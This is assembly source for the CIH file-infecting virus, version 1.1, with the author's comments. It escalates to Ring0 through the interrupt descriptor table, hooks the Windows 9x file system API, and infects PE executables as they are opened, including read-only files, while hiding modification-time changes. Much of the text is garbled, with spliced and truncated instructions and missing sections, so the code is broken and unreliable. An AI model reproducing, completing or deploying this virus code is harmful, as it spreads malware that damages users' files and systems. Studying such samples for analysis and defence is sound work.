; * The Virus Program Information * 
; 
;**************************************************************************** 

; * * 
; * Designer : CIH Original Place : TTIT of Taiwan * 
; * Create Date : 04/26/1998 Now Version : 1.1 * 
; * Modification Time : 05/15/1998 * 
; * * 
; 
;*==========================================================================* 

; * Modification History * 
; 
;*==========================================================================* 

; * v1.0 1. Create the Virus P * 
; * 4. Call IFSMgr_InstallFileSystemApiHook to Hook File System. * 
; * 5. Modifies Entry Point of IFSMgr_InstallFileSystemApiHook. * 
; * 6. When System Opens Existing PE File, the File will be * 
; * Infected, and the File doesn't be Reinfected. * 
; * 7. It is also Infected, even the File is Read-Only. * 
; * 8. When the File is Infected, the Modification Date and Time * 
; * of the File also don't be Changed. * 
; * 9. When My Virus Uses IFSMgr_Ring0_FileIO, it will not Call * 
; * Previous FileSystemApiHook, it will Call the Function * 
; * that the IFS Managle that be Infected will not Increase * 
; * it's Size... ^__^ * 
; * 05/15/1998 2. Hook and Modify Structured Exception Handing. * 
; * When Exception Error Occurs, Our OS System should be in * 
; * Windows NT. So My Cute Virus will not Continue to Run, * 
; * it will Jmup to Original Application to Run. * 
; * 3. Use Better Algorithm, Reduce Virus Code Size. * 
; * 4. The Virus "Basic" Size is only 796 Bytes. * 
; 
;**************************************************************************** 

.586P 

; ********************************************************************ALSE = 

0 

DEBUG = TRUE 

MajorVirusVersion = 1 
MinorVirusVersion = 1 

VirusVersion = MajorVirusVersion*10h+MinorVirusVersion 

HookExceptionNumber = 03h 
FileNameBufferSize = 7fh 

; ********************************************************* 
; ********************************************************* 

VirusGame SEGMENT 

ASSUME CS:VirusGame, DS:VirusGame, SS:VirusGame 
ASSUME ES:VirusGame, FS:VirusGame, GS:VirusGame 

; ********************************************************* 
; * Ring3 Virus Game Initial Program * 
; ********************************************************* 

MyVirusStart: 
push ebp 

; ************************************* 
; * Let's Modify Structured Exception * 
; * Handing, Prevent Exception Error * 
; * Occurrence, Especially in NT. * 
; ************************************* 

lea eax, [esp-04h*2] 

xor ebx, ebx 
xchg eax, fs:[ebx] 

call @0 
@0: 
pop ebx 

lea ecx, StopToRunVirusCode-@0[ebx] 
push ecx 

push eax 

; ************************************* 
; * Let's Modify * 
; * IDT(Interrupt Descriptor Table) * 
; * to Get Ring0 Privilege... * 
; ************************************* 

push eax ; 
sidt [esp-02h] ; Get IDT Base Address 
pop ebx ; 

add ebx, HookExceptionNumber*08h+04h ; ZF = 0 

cli 

mov ebp, [ebx] ; Get Exception Base 
ebx-04h], si ; 
shr esi, 16 ; Modify Exception 
mov [ebx+02h], si ; Entry Point Address 

pop esi 

; ************************************* 
; * Generate Exception to Get Ring0 * 
; ************************************* 

int HookExceptionNumber ; GenerateException 
ReturnAddressOfEndException = $ 

; ************************************* 
; * Merge All Virus Code Section * 
; ************************************* 

push esi 
mov esi, eax 

LoopOfMergeAllVirusCodeSection: 

mov ecx, [eax-04h] 

rep movsb 

sub eax, 08h 

mov esi, [eax] 

or esi, esi 
jz QuitLoopOfMergeAllVirusCodeSection ; ZF = 1 

jmp LoopOfMergeAllVirusCodeSection 

QuitLoopOfMergeAllVirusCodeSection: 

pop esi 

; ************************************* 
; * Generate Exception Again * 
; ************************************* 

int HookExceptionNumber ; GenerateException Ag 
ain 

; ************************************* 
; * Let's Restore * 
; * Structured Exception Handing * 
; ************************************* 

ReadyRestoreSE: 
sti 

xor ebx, ebx 

jmp RestoreSE 

; ************************************* 
; * When Exception Error Occurs, * 
; * Our OS System should be in NT. * 
; * So My Cute Virus will not * 
; * Continue to Run, it Jmups to * 
; * Original Application to Run. * 
; ************************************* 

StopToRunVirusCode: 
@1 = StopToRunVirusCode 

xor ebx, ebx 
mov eax, fs:[ebx] 
mov esp, [eax] 

RestoreSE: 
pop dword ptr fs:[ebx] 
pop eax 

; ************************************* 
; * Return Original App to Execute * 
; ************************************* 

pop ebp 

push 00401000h ; Push Original 
OriginalAddressOfEntryPoint = $-4 ; App Entry Point to Stack 

ret ; Re********************************* 

MyExceptionHook: 
@2 = MyExceptionHook 

jz InstallMyFileSystemApiHook 

; ************************************* 
; * Do My Virus Exist in System !? * 
; ************************************* 

mov ecx, dr0 
jecxz AllocateSystemMemoryPage 

add dword ptr [esp], ReadyRestoreSE-ReturnAddressO 
fEndException 

; ************************************* 
; * Return to Ring3 Initial Program * 
; ************************************* 

ExitRing0Init: 
mov [ebx-04h], bp ; 
shr ebp, 16 ; Restore Exception 
mov [ebx+02h], bp ; 

iretd 

; ************************************* 
; * Allocate SystemMemory Page to Use * 
; ************************************* 

AllocateSystemMemoryPage: 

mov dr0, ebx ; Set the Mark of My Virus Exi 
st in System 

push 00000000fh ; 
push ecx ; 
push 0ffffffffh ; 
push ecx ; 
push ecx ; 
push ecx ; 
push 000000001h ; 
push 000000002h ; 
int 20h ; VMMCALL _PageAllocate 
_PageAllocate = $ ; 
dd 00010053h ; Use EAX, ECX, EDX, and flags 
add esp, 08h*04h 

xchg edi, eax ; EDI = SystemMemory Start Add 
ress 

lea eax, MyVirusStart-@2[esi] 

iretd ; Return to Ring3 Initial Program 

; ************************************* 
; * Install My File System Api Hook * 
; ************************0h ; VXDCALL IFSMgr_InstallFileSystemApiHook 
IFSMgr_InstallFileSystemApiHook = $ ; 
dd 00400067h ; Use EAX, ECX, EDX, and flags 

mov dr0, eax ; Save OldFileSystemApiHook Ad 
dress 

pop eax ; EAX = FileSystemApiHook Address 

; Save Old IFSMgr_InstallFileSystemApiHook Entry Point 
mov ecx, IFSMgr_InstallFileSystemApiHook-@2[esi] 
mov edx, [ecx] 
mov OldInstallFileSystemApiHook-@3[eax], edx 

; Modify IFSMgr_InstallFileSystemApiHook Entry Point 
lea eax, InstallFileSystemApiHook-@3[eax] 
mov [ecx], eax 

cli 

jmp ExitRing0Init 

; ********************************************************* 
; * Code Size of Merge Virus Code Section * 
; ********************************************************* 

CodeSizeOfMergeVirusCodeSection = offset $ 

; ********************************************************* 
; * IFSMgr_InstallFileSystemApiHook * 
; ********************************************************* 

InstallFileSystemApiHook: 
push ebx 

call @4 ; 
@4: ; 
pop ebx ; mov ebx, offset FileSystemApiHook 
add ebx, FileSystemApiHook-@4 ; 

push ebx 
int 20h ; VXDCALL IFSMgr_RemoveFileSystemApiHook 
IFSMgr_RemoveFileSystemApiHook = $ 
dd 00400068h ; Use EAX, ECX, EDX, and flags 
pop eax 

; Call Original IFSMgr_InstallFileSystemApiHook 
; to Link Client FileSystemApiHook 
push dword ptr [esp+8] 
call OldInstallFileSystemApiHook-@3[ebx] 
pop ecx 

push eax 

; Call Original IFSMgr_InstallFileSystemApiHook 
****** 
; * Static Data * 
; ********************************************************* 

OldInstallFileSystemApiHook dd ? 

; ********************************************************* 
; * IFSMgr_FileSystemHook * 
; ********************************************************* 

; ************************************* 
; * IFSMgr_FileSystemHook Entry Point * 
; ************************************* 

FileSystemApiHook: 
@3 = FileSystemApiHook 

pushad 

call @5 ; 
@5: ; 
pop esi ; mov esi, offset VirusGameDataStartAd 
dress 
add esi, VirusGameDataStartAddress-@5 

; ************************************* 
; * Is OnBusy !? * 
; ************************************* 

test byte ptr (OnBusy-@6)[esi], 01h ; if ( OnBusy 
) 
jnz pIFSFunc ; goto pIFSFun 
c 

; ************************************* 
; * Is OpenFile !? * 
; ************************************* 

; if ( NotOpenFile ) 
*********************** 
; * Get FilePath's DriveNumber, * 
; * then Set the DriveName to * 
; * FileNameBuffer. * 
; ************************************* 
; * Ex. If DriveNumber is 03h, * 
; * DriveName is 'C:'. * 
; ************************************* 

; mov esi, offset FileNameBuffer 
add esi, FileNameBuffer-@6 

push esi 

mov al, [ebx+04h] 
cmp al, 0ffh 
je CallUniToBCSPath 

add al, 40h 
mov ah, ':' 

mov [esi], eax 

inc esi 
inc esi 

; ************************************* 
; * UniToBCSPath * 
; ************************************* 
; * This Service Converts * 
; * a Canonicalized Unicode Pathname * 
; * to a Normal Pathname in the * 
; * Specified BCS Character Set. * 
; ************************************* 

CallUniToBCSPath: 
push 00000000h 
push FileNameBufferSize 
mov ebx, [ebx+10h] 
20h ; VXDCall UniToBCSPath 
UniToBCSPath = $ 
dd 00400041h 
add esp, 04h*04h 

; ************************************* 
; * Is FileName '.EXE' !? * 
; ************************************* 

; cmp [esi+eax-04h], '.EXE' 
cmp [esi+eax-04h], 'EXE.' 
pop esi 
jne DisableOnBusy 

IF DEBUG 

; ************************************* 
; * Only for Debug * 
; ************************************* 

; cmp [esi+eax-06h], 'FUCK' 
cmp [esi+eax-06h], 'KCUF' 
jne DisableOnBusy 

ENDIF 

; ************************************* 
; * Is Open Existing File !? * 
; ************************************* 

; if ( NotOpenExistingFile ) 
; goto DisableOnBusy 
cmp word ptr [ebx+18h], 01h 
jne DisableOnBusy 

; ************************************* 
; * Get Attributes of the File * 
; ************************************* 

mov ax, 4300h 
int 20h push ecx 

; ************************************* 
; * Get IFSMgr_Ring0_FileIO Address * 
; ************************************* 

mov edi, dword ptr (IFSMgr_Ring0_FileIO-@7)[esi] 
mov edi, [edi] 

; ************************************* 
; * Is Read-Only File !? * 
; ************************************* 

test cl, 01h 
jz OpenFile 

; ************************************* 
; * Modify Read-Only File to Write * 
; ************************************* 

mov ax, 4301h 
xor ecx, ecx 
call edi ; VXDCall IFSMgr_Ring0_FileIO 

; ************************************* 
; * Open File * 
; ************************************* 

OpenFile: 
xor eax, eax 
mov ah, 0d5h 
xor ecx, ecx 
xor edx, edx 
inc edx 
mov ebx, edx 
inc ebx 
call edi ; VXDCall IFSMgr_Ring0_FileIO 

xchg ebx, eax ; mov ebx, FileHandle 

; ************************************* 
; * Need to Restore * 
; * Attributes of the File !? * 
; ************************************* 

pop ecx 

pushf 

1h 
call edi ; VXDCall IFSMgr_Ring0_FileIO 

; ************************************* 
; * Is Open File OK !? * 
; ************************************* 

IsOpenFileOK: 
popf 

jc DisableOnBusy 

; ************************************* 
; * Open File Already Succeed. ^__^ * 
; ************************************* 

push esi ; Push FileNameBuffer Address to Stack 

pushf ; Now CF = 0, Push Flag to Stack 

add esi, DataBuffer-@7 ; mov esi, offset DataBuffe 
r 

; *************************** 
; * Get OffsetToNewHeader * 
; *************************** 

xor eax, eax 
mov ah, 0d6h 

; For Doing Minimal VirusCode's Length, 
; I Save EAX to EBP. 
mov ebp, eax 

xor ecx, ecx 
mov cl, 04h 
xor edx, edx 
mov dl, 3ch 
call edi ; VXDCall IFSMgr_Ring0_FileIO 

mov edx, [esi] 

; *************************** 
; * Get 'PE\0' Signature * 
; * of ImageFileHeader, and * 
; * Infected Mark. * 
; *************************** 

dec edx 

mov eax, ebp 
call edi ; VXDCall IFSMgr_Ring0_FileIO 

; *************************** 
; * Is PE !? * 
; *************************** 
; * Is the File * 
; * Already Infected !? * 
; *************************** 

; cmp [esi], '\0PE\0' 
cmp dword ptr [esi], 00455000h 
jne CloseFile 

; ************************************* 
; * The File is ^o^ * 
; * PE(Portable Executable) indeed. * 
; ************************************* 
; * The File isn't also Infected. * 
; ************************************* 

; ************************************* 
; * Start to Infect the File * 
; ************************************* 
; * Registers Use Status Now : * 
; * * 
; * EAX = 04h * 
; * EBX = File Handle * 
; * ECX = 04h * 
; * EDX = 'PE\0\0' Signature of * 
; * ImageFileHeader Pointer's * 
; * Former Byte. * 
; * ESI = DataBuffer Address == @8 * 
; * EDI = IFSMgr_Ring0_FileIO Address * 
; * EBP = D600h == Read Data in File * 
; ************************************* 
; * Stack Dump : * 
; * * 
; * ESP = ------------------------- * 
; * | EFLAG(CF=0) | * 
; * ------------------------- * 
; * | FileNameBufferPointer | * 
; * ------------------------- * 
; * | EDI | * 
; * ------------------------- * 
; * | ESI | * 
; * ------------------------- * 
; * | EBP | * 
; * ------------------------- * 
; * | ESP | * 
; * ------------------------- * 
; * | EBX | * 
; * ------------------------- * 
; * | EDX | * 
; * ------------------------- * 
; * | ; * ------------------------- * 
; ************************************* 

push ebx ; Save File Handle 

push 00h ; Set VirusCodeSectionTableEndMark 

; *************************** 
; * Let's Set the * 
; * Virus' Infected Mark * 
; *************************** 

push 01h ; Size 
push edx ; Pointer of File 
push edi ; Address of Buffer 

; *************************** 
; * Save ESP Register * 
; *************************** 

mov dr1, esp 

; *************************** 
; * Let's Set the * 
; * NewAddressOfEntryPoint * 
; * ( Only First Set Size ) * 
; *************************** 

push eax ; Size 

; *************************** 
; * Let's Read * 
; * Image Header in File * 
; *************************** 

mov eax, ebp 
mov cl, SizeOfImageHeaderToRead 
add edx, 07h ; Move EDX to NumberOfSections 
call edi ; VXDCall IFSMgr_Ring0_FileIO 

; *************************** 
; * Let's Set the * 
; * NewAddressOfEntryPoint * 
; * ( Set Pointer of File, * 
; * Address of Buffer ) * 
; *************************** 

lea eax, (AddressOfEntryPoint-@8)[edx] 
push eax ; Pointer of File 

lea eax, (NewAddressOfEntryPoint-@8)[esi] 
push eax ; Address of Buffer 

; *************************** 
; * Move EDX to the Start * 
; * of SectionTable in File * 
; *************************** 

movzx eax, word ptr (SizeOfOptionalHeader-@8)[esi] 
lea edx, [eax+edx+12h] 

; *************************** 
; * Let's Get * 
; * Total Size of Sections * 
; *************************** 

mov al, SizeOfScetionTable 

; I Assume NumberOfSections * 
; * Need to Restore File * 
; * Modification Time * 
; *************************** 

SetFileModificationMark: 
pop ebx 
pop eax 

stc ; Enable CF(Carry Flag) 
pushf 

; ************************************* 
; * Close File * 
; ************************************* 

CloseFile: 
xor eax, eax 
mov ah, 0d7h 
call edi ; VXDCall IFSMgr_Ring0_FileIO 

; ************************************* 
; * Need to Restore File Modification * 
; * Time !? * 
; ************************************* 

popf 
pop esi 
jnc DisableOnBusy 

; **************************** mov ecx, (FileModificationTime-@7)[esi] 
mov edi, (FileModificationTime+2-@7)[esi] 
call ebx ; VXDCall IFSMgr_Ring0_FileIO 

; ************************************* 
; * Disable OnBusy * 
; ************************************* 

DisableOnBusy: 
dec byte ptr (OnBusy-@7)[esi] ; Disable OnBu 
sy 

; ************************************* 
; * Call Previous FileSystemApiHook * 
; ************st. * 
; ************************************* 

pIFSFunc: 
mov ebx, esp 
push dword ptr [ebx+20h+04h+14h] ; Push pioreq 
call [ebx+20h+04h] ; Call pIFSFun 
c 
pop ecx ; 

mov [ebx+1ch], eax ; Modify EAX Value in Stack 

; *************************** 
; * After Calling pIFSFunc, * 
; * Get Some Data from the * 
; * Returned pioreq. * 
; *************************** 

cmp dword ptr [ebx+20h+04h+04h], 00000024h 
jne QuitMyVirusFileSystemHook 

; ***************** 
; * Get the File * 
; * Modification * 
; * Date and Time * 
; * in DOS Format.* 
; ***************** 

mov eax, [ecx+28h] 
mov (FileModificationTime-@6)[esi], eax 

; *************************** 
; * Quit My Virus' * 
; * IFSMgr_FileSystemHook * 
; *************************** 

QuitMyVirusFileSystemHook: 

popad 

ret 

; ********************************************************* 
; * Static Data * 
; *****_RemoveFileSystemApiHook-_PageAllocate 
db UniToBCSPath-IFSMgr_RemoveFileSystemApiHook 
db IFSMgr_Ring0_FileIO-UniToBCSPath 

VxDCallIDTable dd 00010053h, 00400068h, 00400041h, 00400032h 
Virus Size * 
; ********************************************************* 

VirusSize = $ 
; + SizeOfVirusCodeSectionTableEndMark(04h) 
; + NumberOfSections(??)*SizeOfVirusCodeSectionT 
able(08h) 
; + SizeOfTheFirstVirusCodeSectionTable(04h) 

; ********************************************************* 
; * Dynamic Data * 
; ********************************************************* 

VirusGameDataStartAddress = VirusSize 
@6 = VirusGameDataStartAddress 
OnBusy db 0 
FileModificationTime dd ? 

FileNameBuffer db FileNameBufferSize dup(?) 
@7 = FileNameBuffer 

DataBuffer = $ 
@8 = DataBuffer 
NumberOfSections dw ? 
TimeDateStamp dd ? 
SymbolsPointer dd ? 
NumberOfSymbols dd ? 
SizeOfOptionalHeader dw ? 
_Characteristics dw ? 
Magic dw ? 
LinkerVersion dw ? 
SizeOfCode dd ? 
SizeOfInitializedData dd ? 
SizeOfUninitializedData dd ? 
AddressOfEntryPoint dd ? 
BaseOfCode dd ? 
BaseOfData dd ? 
ImageBase dd ? 
@9 = $ 
SectionAlignm dd ? 
SizeOfImage dd ? 
SizeOfHeaders dd ? 
SizeOfImageHeaderToRead = $-NumberOfSections 

NewAddressOfEntryPoint = DataBuffer ; DWORD 
SizeOfImageHeaderToWrite = 04h 

StartOfSectionTable = @9 
SectionName = StartOfSectionTable ; QWORD 
VirtualSize = StartOfSectionTable+08h ; DWORD 
VirtualAddress = StartOfSectionTable+0ch ; DWORD 
SizeOfRawData = StartOfSectionTable+10h ; DWORD 
PointerToRawData = StartOfSectionTable+14h ; DWORD 
PointerToRelocations = StartOfSectionTable+18h ; DWORD 
PointerToLineNumbers = StartOfSectionTable+1ch ; DWORD 
NumberOfRelocations = StartOfSectionTable+20h ; WORD 
NumberOfLinenNmbers = StartOfSectionTable+22h ; WORD 
Characteristics = StartOfSectionTable+24h ; DWORD 
SizeOfScetionTable = Characteristics+04h-SectionName 

; ********************************************************* 
; * Virus Total Need Memory * 
; ********************************************************* 

VirusNeedBaseMemory = $ 

VirusTotalNeedMemory = @9 
; + NumberOfSections( + NumberOfSections(??)*SizeOfVirusCodeSectionT 
able(08h) 
; + SizeOfTheFirstVirusCodeSectionTable(04h) 

; ********************************************************* 
; ********************************************************* 

VirusGame ENDS 

END FileHeader
